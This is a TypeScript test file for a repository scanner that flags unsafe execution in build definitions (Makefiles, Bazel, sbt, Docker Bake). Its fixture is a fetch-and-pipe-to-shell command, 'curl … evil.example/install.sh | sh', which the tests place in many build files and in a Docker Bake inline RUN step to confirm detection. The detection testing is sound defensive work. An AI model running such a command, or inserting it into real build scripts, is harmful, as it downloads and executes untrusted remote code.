import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a build definition of a recognized build system is an install surface", () => {
  // PRD section 8: the scan checks install and build scripts. A build
  // definition runs commands at build time, so it is install content.
  for (const path of [
    "Makefile.in",
    "GNUmakefile.in",
    "Makefile.inc",
    "configure.ac",
    "configure.in",
    "m4/ax_check.m4",
    "build",
    "build.xml",
    "build.ninja",
    "Tupfile",
    "build.sbt",
    "project/plugins.sbt",
    "build.boot",
    "build",
    "BUILD.bazel",
    "WORKSPACE",
    "WORKSPACE.bazel",
    "tools/defs.bzl",
    "wscript_build",
    "docker-bake.hcl",
  ]) {
    const inspection = inspected(path, `${PAYLOAD}\n`);
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
    expect({ path, coverage: inspection.coverage.installScripts }).toEqual({
      path,
      coverage: { state: "complete", items: 1 },
    });
    expect({
      path,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ path, findings: [`${path}:unsafe-execution:high`] });
  }
});

test("changing a build definition changes the reviewed inventory", () => {
  const before = inspected("build.sbt", 'name := "app"\n');
  const after = inspected(
    "build.sbt",
    'name := "app"\nscalaVersion := "3.4.0"\n',
  );
  expect(Buffer.compare(before.inventory, after.inventory) === 0).toBe(false);
  expect(before.inventorySha256 === after.inventorySha256).toBe(false);
});

test("Docker Bake's automatic HCL override is scanned and changes the reuse key", () => {
  const scan = (override: string) =>
    inspectRepository({
      files: [
        {
          path: "docker-bake.hcl",
          bytes: new TextEncoder().encode(
            'target "default" { context = "." }\n',
          ),
        },
        {
          path: "docker-bake.override.hcl",
          bytes: new TextEncoder().encode(override),
        },
      ],
    });
  const before = scan('target "default" { dockerfile = "Dockerfile" }\n');
  const after = scan(
    `target "default" {\n  dockerfile-inline = <<EOF\nFROM alpine\nRUN ${PAYLOAD}\nEOF\n}\n`,
  );
  expect(after.coverage.installScripts).toEqual({
    state: "complete",
    items: 2,
  });
  expect(after.findings).toContainEqual(
    expect.objectContaining({
      path: "docker-bake.override.hcl",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(after.downloads).toContain("https://evil.example/install.sh");
  expect(after.inventorySha256).not.toBe(before.inventorySha256);
});

test("the executable surface stays bounded", () => {
  // Only build definitions are added: unrelated extensionless files keep no
  // surface, so the inventory does not become a blanket text scan.
  expect(surfacesOf("LICENSE")).toEqual([]);
  expect(surfacesOf("NOTICE")).toEqual([]);
  expect(inspected("NOTICE", PAYLOAD).findings).toEqual([]);
});
